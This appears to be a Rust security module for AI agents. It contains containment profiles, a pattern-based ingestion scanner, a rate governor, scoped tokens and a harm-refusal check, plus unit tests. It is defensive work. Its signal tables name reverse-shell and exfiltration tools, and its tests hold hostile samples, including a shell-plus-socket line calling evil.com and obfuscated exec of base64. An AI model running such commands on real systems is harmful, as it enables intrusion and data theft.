//! # Mercy-Security — White-Hat AGSi Defense (v14.15.5)
//!
//! Defensive surface designed against the July 2026 OpenAI → Hugging Face
//! autonomous agent breach class and related AI supply-chain / containment failures.
//!
//! Core capabilities:
//! - Hard containment profiles (network, code execution, credential visibility)
//! - Deep multi-layer IngestionScanner (remote-code, template injection, gadgets, C2, obfuscation)
//! - Autonomous action governor (rate limits, volume anomaly, C2-like patterns)
//! - Secret isolation (agents never receive long-lived credentials)
//! - Never-disable real-world harm refusals (even in evaluation mode)
//! - White-hat evaluation harness under strict sandbox + full audit log
//!
//! TOLC 8 + PATSAGi aligned | AG-SML v1.0 | Contact: info@Rathor.ai

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use thiserror::Error;
use uuid::Uuid;

/// Canonical mercy valence floor for all security decisions.
pub const MERCY_VALENCE_FLOOR: f64 = 0.999;

// =============================================================================
// Error surface
// =============================================================================

#[derive(Debug, Error, Clone, PartialEq)]
pub enum MercySecurityError {
    #[error("containment violation: {0}")]
    ContainmentViolation(String),

    #[error("ingestion blocked: {0}")]
    IngestionBlocked(String),

    #[error("action rate / volume limit exceeded: {0}")]
    ActionLimitExceeded(String),

    #[error("secret isolation violation: agents must never receive long-lived credentials")]
    SecretIsolationViolation,

    #[error("evaluation refused: real-world harm / unauthorized access path detected")]
    HarmRefusalActive,

    #[error("invalid numeric input: {0}")]
    InvalidNumeric(String),

    #[error("internal: {0}")]
    Internal(String),
}

// =============================================================================
// 1. Containment Profiles
// =============================================================================

/// What an agent is allowed to do. Default is maximally restrictive.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContainmentProfile {
    pub id: Uuid,
    pub name: String,
    /// Allow outbound network beyond an allow-list of internal services.
    pub allow_unrestricted_network: bool,
    /// Allow execution of code supplied by datasets, models, or user content.
    pub allow_remote_code_execution: bool,
    /// Allow agents to see or use long-lived credentials / API keys.
    pub allow_long_lived_credentials: bool,
    /// Allow agents to spawn additional short-lived sandboxes without human approval.
    pub allow_unbounded_sandbox_spawn: bool,
    /// Maximum concurrent short-lived execution environments.
    pub max_concurrent_sandboxes: u32,
    /// Maximum actions per minute before governor trips.
    pub max_actions_per_minute: u32,
    pub created_at: DateTime<Utc>,
}

impl Default for ContainmentProfile {
    fn default() -> Self {
        Self {
            id: Uuid::new_v4(),
            name: "strict_whitehat".into(),
            allow_unrestricted_network: false,
            allow_remote_code_execution: false,
            allow_long_lived_credentials: false,
            allow_unbounded_sandbox_spawn: false,
            max_concurrent_sandboxes: 4,
            max_actions_per_minute: 60,
            created_at: Utc::now(),
        }
    }
}

impl ContainmentProfile {
    /// Evaluation profile: still never disables real-world harm refusals or long-lived secrets.
    pub fn evaluation() -> Self {
        Self {
            name: "evaluation_whitehat".into(),
            allow_unrestricted_network: false,
            allow_remote_code_execution: false,
            allow_long_lived_credentials: false,
            allow_unbounded_sandbox_spawn: false,
            max_concurrent_sandboxes: 8,
            max_actions_per_minute: 120,
            ..Self::default()
        }
    }

    pub fn check_network_allowed(&self, target_is_external: bool) -> Result<(), MercySecurityError> {
        if target_is_external && !self.allow_unrestricted_network {
            return Err(MercySecurityError::ContainmentViolation(
                "unrestricted external network blocked by containment profile".into(),
            ));
        }
        Ok(())
    }

    pub fn check_code_exec_allowed(&self) -> Result<(), MercySecurityError> {
        if !self.allow_remote_code_execution {
            return Err(MercySecurityError::ContainmentViolation(
                "remote / untrusted code execution blocked by containment profile".into(),
            ));
        }
        Ok(())
    }
}

// =============================================================================
// 2. Deep Ingestion Scanner (dataset / model / config)
// =============================================================================

/// Threat classes aligned to July 2026 HF incident + common AI supply-chain vectors.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash)]
pub enum IngestionThreat {
    /// HF-style trust_remote_code / dynamic import / loader execution
    RemoteCodeLoader,
    /// Jinja / format / config template injection with code context
    TemplateInjection,
    /// pickle / joblib / torch / onnx unsafe deserialization gadgets
    SerializationGadget,
    /// subprocess / os.system / shell=True / Popen
    ShellProcessSpawn,
    /// reverse shell, webhook C2, unexpected outbound callback patterns
    NetworkCallback,
    /// base64+exec, hex decode+eval, compile() obfuscation
    ObfuscatedPayload,
    /// dataset_infos / loading_script / config injection specific to HF pipelines
    DatasetConfigInjection,
    /// credential / secret material patterns
    CredentialHarvestPattern,
    /// catch-all high-risk when combination rules fire
    UnknownHighRisk,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskTier {
    None = 0,
    Low = 1,
    Medium = 2,
    High = 3,
    Critical = 4,
}

impl RiskTier {
    pub fn as_str(&self) -> &'static str {
        match self {
            RiskTier::None => "none",
            RiskTier::Low => "low",
            RiskTier::Medium => "medium",
            RiskTier::High => "high",
            RiskTier::Critical => "critical",
        }
    }
}

/// A single matched signal with confidence in [0.0, 1.0].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanFinding {
    pub threat: IngestionThreat,
    pub signal: String,
    pub confidence: f32,
    /// Optional approximate byte offset of first match (best-effort).
    pub offset: Option<usize>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IngestionScanResult {
    pub safe: bool,
    pub risk_tier: RiskTier,
    /// 0.0 ..= 1.0 aggregate risk score
    pub risk_score: f32,
    pub threats: Vec<IngestionThreat>,
    pub findings: Vec<ScanFinding>,
    pub details: Vec<String>,
    pub scanned_at: DateTime<Utc>,
    pub bytes_scanned: usize,
}

/// Multi-layer pattern + combination-rule scanner for untrusted ingestion surfaces.
pub struct IngestionScanner;

impl IngestionScanner {
    // ---- Layer signal tables ------------------------------------------------

    fn remote_code_signals() -> &'static [(&'static str, f32)] {
        &[
            ("trust_remote_code", 0.98),
            ("remote_code=true", 0.97),
            ("remote_code = true", 0.97),
            ("trust_remote_code=true", 0.99),
            ("__import__", 0.85),
            ("importlib.import_module", 0.88),
            ("importlib.util", 0.80),
            ("exec(", 0.92),
            ("eval(", 0.92),
            ("compile(", 0.78),
            ("__builtins__", 0.90),
            ("__class__", 0.72),
            ("globals()", 0.70),
            ("locals()", 0.65),
            ("getattr(", 0.55),
            ("setattr(", 0.55),
            ("ctypes", 0.75),
            ("cffi", 0.70),
            ("loading_script", 0.88),
            ("dataset_script", 0.85),
            ("_generate_examples", 0.70),
            ("huggingface_hub.hf_api", 0.60),
        ]
    }

    fn serialization_gadget_signals() -> &'static [(&'static str, f32)] {
        &[
            ("pickle.loads", 0.95),
            ("pickle.load", 0.93),
            ("_pickle", 0.80),
            ("joblib.load", 0.90),
            ("torch.load", 0.88),
            ("torch.jit.load", 0.82),
            ("onnxruntime", 0.50),
            ("numpy.load", 0.55),
            ("yaml.load(", 0.85),
            ("yaml.unsafe_load", 0.97),
            ("marshal.loads", 0.90),
            ("shelve.open", 0.70),
            ("dill.loads", 0.92),
            ("cloudpickle", 0.90),
        ]
    }

    fn shell_spawn_signals() -> &'static [(&'static str, f32)] {
        &[
            ("subprocess", 0.88),
            ("os.system", 0.95),
            ("os.popen", 0.92),
            ("shell=true", 0.93),
            ("shell = true", 0.93),
            ("popen(", 0.80),
            ("commands.getoutput", 0.85),
            ("pty.spawn", 0.90),
            ("/bin/sh", 0.85),
            ("/bin/bash", 0.85),
            ("cmd.exe", 0.85),
            ("powershell", 0.80),
        ]
    }

    fn network_callback_signals() -> &'static [(&'static str, f32)] {
        &[
            ("reverse shell", 0.95),
            ("/dev/tcp/", 0.92),
            ("socket.connect", 0.80),
            ("requests.post", 0.55),
            ("urllib.request", 0.55),
            ("http.client", 0.55),
            ("webhook", 0.50),
            ("ngrok", 0.70),
            ("discord.com/api/webhooks", 0.85),
            ("pastebin.com", 0.70),
            ("transfer.sh", 0.75),
            ("curl ", 0.45),
            ("wget ", 0.45),
            ("nc -e", 0.95),
            ("ncat ", 0.90),
            ("socat ", 0.88),
        ]
    }

    fn obfuscation_signals() -> &'static [(&'static str, f32)] {
        &[
            ("base64.b64decode", 0.80),
            ("base64.b64decode(", 0.85),
            ("codecs.decode", 0.70),
            ("bytes.fromhex", 0.75),
            ("chr(", 0.40),
            ("ord(", 0.35),
            ("eval(compile(", 0.97),
            ("exec(compile(", 0.97),
            ("__reduce__", 0.90),
            ("__setstate__", 0.85),
            ("marshal.loads(base64", 0.95),
        ]
    }

    fn template_signals() -> &'static [(&'static str, f32)] {
        &[
            ("{{", 0.40),
            ("{%", 0.50),
            ("${", 0.35),
            ("jinja", 0.70),
            ("jinja2", 0.75),
            ("template.render", 0.85),
            ("environment.from_string", 0.88),
            ("mako.template", 0.85),
            ("string.template", 0.60),
            ("format(", 0.30),
            ("%s", 0.20),
            ("f\"", 0.15),
        ]
    }

    fn dataset_config_signals() -> &'static [(&'static str, f32)] {
        &[
            ("dataset_infos.json", 0.60),
            ("loading_script", 0.85),
            ("_urls", 0.40),
            ("download_and_extract", 0.55),
            ("dl_manager", 0.65),
            ("builder_config", 0.55),
            ("gen_kwargs", 0.50),
            ("script_version", 0.45),
            ("features=datasets", 0.35),
        ]
    }

    fn credential_signals() -> &'static [(&'static str, f32)] {
        &[
            ("aws_secret_access_key", 0.95),
            ("aws_access_key_id", 0.90),
            ("api_key", 0.70),
            ("apikey", 0.70),
            ("private_key", 0.85),
            ("-----begin private key-----", 0.98),
            ("-----begin rsa private key-----", 0.98),
            ("bearer ", 0.75),
            ("authorization: bearer", 0.85),
            ("x-api-key", 0.80),
            ("secret_key", 0.75),
            ("client_secret", 0.85),
            ("hf_token", 0.90),
            ("huggingface_token", 0.90),
            ("openai_api_key", 0.92),
            ("anthropic_api_key", 0.92),
        ]
    }

    // ---- Core scan ------------------------------------------------------------

    fn match_signals(
        lower: &str,
        original: &str,
        table: &[(&str, f32)],
        threat: IngestionThreat,
        findings: &mut Vec<ScanFinding>,
    ) {
        for (sig, conf) in table {
            if lower.contains(sig) {
                let offset = original.to_lowercase().find(sig);
                findings.push(ScanFinding {
                    threat: threat.clone(),
                    signal: (*sig).into(),
                    confidence: *conf,
                    offset,
                });
            }
        }
    }

    /// Full multi-layer scan. Does not block; returns structured risk.
    pub fn scan_text(content: &str) -> IngestionScanResult {
        let lower = content.to_lowercase();
        let mut findings: Vec<ScanFinding> = Vec::new();

        Self::match_signals(&lower, content, Self::remote_code_signals(), IngestionThreat::RemoteCodeLoader, &mut findings);
        Self::match_signals(&lower, content, Self::serialization_gadget_signals(), IngestionThreat::SerializationGadget, &mut findings);
        Self::match_signals(&lower, content, Self::shell_spawn_signals(), IngestionThreat::ShellProcessSpawn, &mut findings);
        Self::match_signals(&lower, content, Self::network_callback_signals(), IngestionThreat::NetworkCallback, &mut findings);
        Self::match_signals(&lower, content, Self::obfuscation_signals(), IngestionThreat::ObfuscatedPayload, &mut findings);
        Self::match_signals(&lower, content, Self::dataset_config_signals(), IngestionThreat::DatasetConfigInjection, &mut findings);
        Self::match_signals(&lower, content, Self::credential_signals(), IngestionThreat::CredentialHarvestPattern, &mut findings);

        // Template injection: only elevate when template marker co-occurs with code context
        let mut template_hits = Vec::new();
        Self::match_signals(&lower, content, Self::template_signals(), IngestionThreat::TemplateInjection, &mut template_hits);

        let has_code_context = findings.iter().any(|f| {
            matches!(
                f.threat,
                IngestionThreat::RemoteCodeLoader
                    | IngestionThreat::ShellProcessSpawn
                    | IngestionThreat::SerializationGadget
                    | IngestionThreat::ObfuscatedPayload
            )
        }) || lower.contains("__class__")
            || lower.contains("__builtins__")
            || lower.contains("exec")
            || lower.contains("eval");

        if has_code_context {
            for mut t in template_hits {
                // Boost confidence when combined with code context
                t.confidence = (t.confidence + 0.35).min(0.99);
                findings.push(t);
            }
        } else {
            // Keep only high-confidence standalone template engine references
            for t in template_hits {
                if t.confidence >= 0.70 {
                    findings.push(t);
                }
            }
        }

        // Combination rules (HF incident style: loader + config + possible network)
        let has_remote = findings.iter().any(|f| f.threat == IngestionThreat::RemoteCodeLoader);
        let has_dataset_cfg = findings.iter().any(|f| f.threat == IngestionThreat::DatasetConfigInjection);
        let has_network = findings.iter().any(|f| f.threat == IngestionThreat::NetworkCallback);
        let has_shell = findings.iter().any(|f| f.threat == IngestionThreat::ShellProcessSpawn);
        let has_obfuscation = findings.iter().any(|f| f.threat == IngestionThreat::ObfuscatedPayload);

        if has_remote && has_dataset_cfg {
            findings.push(ScanFinding {
                threat: IngestionThreat::UnknownHighRisk,
                signal: "combo:remote_code+dataset_config".into(),
                confidence: 0.96,
                offset: None,
            });
        }
        if has_remote && has_network {
            findings.push(ScanFinding {
                threat: IngestionThreat::UnknownHighRisk,
                signal: "combo:remote_code+network_callback".into(),
                confidence: 0.97,
                offset: None,
            });
        }
        if has_shell && has_network {
            findings.push(ScanFinding {
                threat: IngestionThreat::UnknownHighRisk,
                signal: "combo:shell+network_callback".into(),
                confidence: 0.98,
                offset: None,
            });
        }
        if has_obfuscation && (has_remote || has_shell) {
            findings.push(ScanFinding {
                threat: IngestionThreat::UnknownHighRisk,
                signal: "combo:obfuscation+code_exec".into(),
                confidence: 0.97,
                offset: None,
            });
        }

        // Aggregate
        let mut threats: Vec<IngestionThreat> = findings.iter().map(|f| f.threat.clone()).collect();
        threats.sort_by(|a, b| format!("{:?}", a).cmp(&format!("{:?}", b)));
        threats.dedup();

        let max_conf = findings.iter().map(|f| f.confidence).fold(0.0_f32, f32::max);
        let sum_conf: f32 = findings.iter().map(|f| f.confidence).sum();
        let risk_score = if findings.is_empty() {
            0.0
        } else {
            // Emphasize strongest signal; dampen pure count inflation
            (0.65 * max_conf + 0.35 * (sum_conf / findings.len() as f32)).clamp(0.0, 1.0)
        };

        let risk_tier = if risk_score >= 0.90 || findings.iter().any(|f| f.confidence >= 0.95) {
            RiskTier::Critical
        } else if risk_score >= 0.70 || threats.iter().any(|t| {
            matches!(
                t,
                IngestionThreat::RemoteCodeLoader
                    | IngestionThreat::SerializationGadget
                    | IngestionThreat::ShellProcessSpawn
                    | IngestionThreat::UnknownHighRisk
            )
        }) {
            RiskTier::High
        } else if risk_score >= 0.40 {
            RiskTier::Medium
        } else if risk_score > 0.0 {
            RiskTier::Low
        } else {
            RiskTier::None
        };

        // Hard safety: Critical and High are not safe for unattended ingestion
        let safe = matches!(risk_tier, RiskTier::None | RiskTier::Low);

        let details: Vec<String> = findings
            .iter()
            .map(|f| {
                format!(
                    "{:?} signal='{}' conf={:.2} offset={:?}",
                    f.threat, f.signal, f.confidence, f.offset
                )
            })
            .collect();

        IngestionScanResult {
            safe,
            risk_tier,
            risk_score,
            threats,
            findings,
            details,
            scanned_at: Utc::now(),
            bytes_scanned: content.len(),
        }
    }

    /// Hard gate: blocks Critical and High. Medium/Low may be allowed by caller policy.
    pub fn admit_or_block(content: &str) -> Result<IngestionScanResult, MercySecurityError> {
        let result = Self::scan_text(content);
        if !result.safe {
            return Err(MercySecurityError::IngestionBlocked(format!(
                "tier={} score={:.2} threats={:?} findings={}",
                result.risk_tier.as_str(),
                result.risk_score,
                result.threats,
                result.findings.len()
            )));
        }
        Ok(result)
    }

    /// Explicit policy: block only Critical (allow High with human review flag).
    pub fn admit_or_block_critical_only(content: &str) -> Result<IngestionScanResult, MercySecurityError> {
        let result = Self::scan_text(content);
        if result.risk_tier == RiskTier::Critical {
            return Err(MercySecurityError::IngestionBlocked(format!(
                "critical tier score={:.2} threats={:?}",
                result.risk_score, result.threats
            )));
        }
        Ok(result)
    }
}

// =============================================================================
// 3. Autonomous Action Governor
// =============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActionRecord {
    pub action_id: Uuid,
    pub kind: String,
    pub timestamp: DateTime<Utc>,
    pub sandbox_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ActionGovernor {
    pub profile: ContainmentProfile,
    pub recent_actions: Vec<ActionRecord>,
    pub total_actions: u64,
    pub trips: u32,
}

impl ActionGovernor {
    pub fn new(profile: ContainmentProfile) -> Self {
        Self {
            profile,
            recent_actions: Vec::new(),
            total_actions: 0,
            trips: 0,
        }
    }

    pub fn record_and_check(&mut self, kind: &str, sandbox_id: Option<&str>) -> Result<(), MercySecurityError> {
        let now = Utc::now();
        self.recent_actions
            .retain(|a| (now - a.timestamp).num_seconds() < 60);

        if self.recent_actions.len() as u32 >= self.profile.max_actions_per_minute {
            self.trips += 1;
            return Err(MercySecurityError::ActionLimitExceeded(format!(
                ">{} actions/min (trip #{})",
                self.profile.max_actions_per_minute, self.trips
            )));
        }

        if let Some(_sid) = sandbox_id {
            let unique_sandboxes: std::collections::HashSet<_> = self
                .recent_actions
                .iter()
                .filter_map(|a| a.sandbox_id.as_ref())
                .collect();
            if unique_sandboxes.len() > self.profile.max_concurrent_sandboxes as usize
                && !self.profile.allow_unbounded_sandbox_spawn
            {
                self.trips += 1;
                return Err(MercySecurityError::ActionLimitExceeded(format!(
                    "sandbox churn exceeded max_concurrent_sandboxes={}",
                    self.profile.max_concurrent_sandboxes
                )));
            }
        }

        self.recent_actions.push(ActionRecord {
            action_id: Uuid::new_v4(),
            kind: kind.into(),
            timestamp: now,
            sandbox_id: sandbox_id.map(|s| s.into()),
        });
        self.total_actions += 1;
        Ok(())
    }
}

// =============================================================================
// 4. Secret Isolation
// =============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScopedToken {
    pub token_id: Uuid,
    pub scope: String,
    pub expires_at: DateTime<Utc>,
    pub issued_at: DateTime<Utc>,
}

pub struct SecretVault;

impl SecretVault {
    pub fn issue_scoped_token(scope: &str, ttl_secs: i64) -> Result<ScopedToken, MercySecurityError> {
        if ttl_secs <= 0 || ttl_secs > 3600 {
            return Err(MercySecurityError::Internal(
                "ttl must be 1..=3600 seconds".into(),
            ));
        }
        Ok(ScopedToken {
            token_id: Uuid::new_v4(),
            scope: scope.into(),
            issued_at: Utc::now(),
            expires_at: Utc::now() + chrono::Duration::seconds(ttl_secs),
        })
    }

    pub fn refuse_long_lived_credential() -> MercySecurityError {
        MercySecurityError::SecretIsolationViolation
    }
}

// =============================================================================
// 5. Never-Disable Harm Refusals
// =============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HarmRefusalPolicy {
    pub real_world_unauthorized_access: bool,
    pub data_exfiltration: bool,
    pub lateral_movement: bool,
    pub credential_theft: bool,
}

impl Default for HarmRefusalPolicy {
    fn default() -> Self {
        Self {
            real_world_unauthorized_access: true,
            data_exfiltration: true,
            lateral_movement: true,
            credential_theft: true,
        }
    }
}

impl HarmRefusalPolicy {
    pub fn check_action(&self, action_description: &str) -> Result<(), MercySecurityError> {
        let lower = action_description.to_lowercase();
        if self.real_world_unauthorized_access
            && (lower.contains("unauthorized")
                || lower.contains("break out")
                || lower.contains("escape sandbox")
                || lower.contains("gain internet access"))
        {
            return Err(MercySecurityError::HarmRefusalActive);
        }
        if self.data_exfiltration
            && (lower.contains("exfil")
                || lower.contains("steal data")
                || lower.contains("dump credentials"))
        {
            return Err(MercySecurityError::HarmRefusalActive);
        }
        if self.lateral_movement && lower.contains("lateral") {
            return Err(MercySecurityError::HarmRefusalActive);
        }
        if self.credential_theft
            && (lower.contains("harvest credential")
                || lower.contains("steal key")
                || lower.contains("api key"))
        {
            return Err(MercySecurityError::HarmRefusalActive);
        }
        Ok(())
    }
}

// =============================================================================
// 6. White-Hat Evaluation Harness
// =============================================================================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EvaluationEvent {
    pub id: Uuid,
    pub description: String,
    pub allowed: bool,
    pub reason: String,
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WhiteHatEvaluationHarness {
    pub profile: ContainmentProfile,
    pub refusal: HarmRefusalPolicy,
    pub governor: ActionGovernor,
    pub log: Vec<EvaluationEvent>,
}

impl WhiteHatEvaluationHarness {
    pub fn new() -> Self {
        let profile = ContainmentProfile::evaluation();
        let governor = ActionGovernor::new(profile.clone());
        Self {
            profile,
            refusal: HarmRefusalPolicy::default(),
            governor,
            log: Vec::new(),
        }
    }

    pub fn try_action(
        &mut self,
        description: &str,
        involves_external_network: bool,
        involves_code_exec: bool,
        sandbox_id: Option<&str>,
    ) -> Result<(), MercySecurityError> {
        self.refusal.check_action(description)?;
        self.profile.check_network_allowed(involves_external_network)?;
        if involves_code_exec {
            self.profile.check_code_exec_allowed()?;
        }
        self.governor.record_and_check(description, sandbox_id)?;

        self.log.push(EvaluationEvent {
            id: Uuid::new_v4(),
            description: description.into(),
            allowed: true,
            reason: "passed white-hat gates".into(),
            timestamp: Utc::now(),
        });
        Ok(())
    }

    pub fn audit_log(&self) -> &[EvaluationEvent] {
        &self.log
    }
}

impl Default for WhiteHatEvaluationHarness {
    fn default() -> Self {
        Self::new()
    }
}

// =============================================================================
// Top-level facade
// =============================================================================

#[derive(Debug, Clone)]
pub struct MercySecuritySurface {
    pub default_profile: ContainmentProfile,
    pub refusal: HarmRefusalPolicy,
}

impl MercySecuritySurface {
    pub fn new() -> Self {
        Self {
            default_profile: ContainmentProfile::default(),
            refusal: HarmRefusalPolicy::default(),
        }
    }

    pub fn scan_ingestion(&self, content: &str) -> Result<IngestionScanResult, MercySecurityError> {
        IngestionScanner::admit_or_block(content)
    }

    pub fn scan_ingestion_report(&self, content: &str) -> IngestionScanResult {
        IngestionScanner::scan_text(content)
    }

    pub fn issue_scoped_token(&self, scope: &str, ttl_secs: i64) -> Result<ScopedToken, MercySecurityError> {
        SecretVault::issue_scoped_token(scope, ttl_secs)
    }

    pub fn evaluation_harness(&self) -> WhiteHatEvaluationHarness {
        WhiteHatEvaluationHarness::new()
    }
}

impl Default for MercySecuritySurface {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn blocks_remote_code_loader() {
        let content = "dataset = load_dataset('x', trust_remote_code=True)";
        let err = IngestionScanner::admit_or_block(content);
        assert!(matches!(err, Err(MercySecurityError::IngestionBlocked(_))));
    }

    #[test]
    fn blocks_hf_combo_remote_plus_config() {
        let content = r#"
            loading_script = "poison.py"
            trust_remote_code = True
            dl_manager.download_and_extract(url)
        "#;
        let r = IngestionScanner::scan_text(content);
        assert!(r.risk_tier >= RiskTier::High);
        assert!(r.threats.contains(&IngestionThreat::RemoteCodeLoader));
        assert!(r.threats.contains(&IngestionThreat::DatasetConfigInjection)
            || r.threats.contains(&IngestionThreat::UnknownHighRisk));
    }

    #[test]
    fn blocks_pickle_gadget() {
        let content = "model = pickle.loads(payload)";
        let r = IngestionScanner::scan_text(content);
        assert!(r.threats.contains(&IngestionThreat::SerializationGadget));
        assert!(!r.safe);
    }

    #[test]
    fn blocks_obfuscated_exec() {
        let content = "exec(compile(base64.b64decode(x), '<string>', 'exec'))";
        let r = IngestionScanner::scan_text(content);
        assert!(r.risk_tier >= RiskTier::High);
        assert!(r.threats.contains(&IngestionThreat::ObfuscatedPayload)
            || r.threats.contains(&IngestionThreat::RemoteCodeLoader)
            || r.threats.contains(&IngestionThreat::UnknownHighRisk));
    }

    #[test]
    fn blocks_shell_plus_network_combo() {
        let content = "subprocess.Popen('/bin/bash', shell=True); socket.connect(('evil.com', 443))";
        let r = IngestionScanner::scan_text(content);
        assert!(r.risk_tier >= RiskTier::High);
        assert!(r.threats.contains(&IngestionThreat::UnknownHighRisk)
            || (r.threats.contains(&IngestionThreat::ShellProcessSpawn)
                && r.threats.contains(&IngestionThreat::NetworkCallback)));
    }

    #[test]
    fn template_injection_with_code_context() {
        let content = "template.render(user_input); exec(user_input)";
        let r = IngestionScanner::scan_text(content);
        assert!(r.threats.contains(&IngestionThreat::TemplateInjection)
            || r.threats.contains(&IngestionThreat::RemoteCodeLoader));
        assert!(!r.safe);
    }

    #[test]
    fn allows_clean_content() {
        let content = "This is a normal markdown description of a model for image classification.";
        let r = IngestionScanner::admit_or_block(content);
        assert!(r.is_ok());
        let ok = r.unwrap();
        assert!(ok.safe);
        assert_eq!(ok.risk_tier, RiskTier::None);
    }

    #[test]
    fn credential_pattern_detected() {
        let content = "export OPENAI_API_KEY=sk-abc123; hf_token=hf_xxx";
        let r = IngestionScanner::scan_text(content);
        assert!(r.threats.contains(&IngestionThreat::CredentialHarvestPattern));
    }

    #[test]
    fn harm_refusal_blocks_sandbox_escape() {
        let policy = HarmRefusalPolicy::default();
        let err = policy.check_action("attempt to escape sandbox and gain internet access");
        assert!(matches!(err, Err(MercySecurityError::HarmRefusalActive)));
    }

    #[test]
    fn action_governor_trips_on_rate() {
        let mut gov = ActionGovernor::new(ContainmentProfile {
            max_actions_per_minute: 3,
            ..ContainmentProfile::default()
        });
        assert!(gov.record_and_check("a", None).is_ok());
        assert!(gov.record_and_check("b", None).is_ok());
        assert!(gov.record_and_check("c", None).is_ok());
        assert!(matches!(
            gov.record_and_check("d", None),
            Err(MercySecurityError::ActionLimitExceeded(_))
        ));
    }

    #[test]
    fn secret_vault_issues_scoped_token() {
        let tok = SecretVault::issue_scoped_token("read:models", 300).unwrap();
        assert!(!tok.scope.is_empty());
    }

    #[test]
    fn evaluation_harness_blocks_external_network() {
        let mut h = WhiteHatEvaluationHarness::new();
        let err = h.try_action("probe external host", true, false, None);
        assert!(matches!(err, Err(MercySecurityError::ContainmentViolation(_))));
    }
}
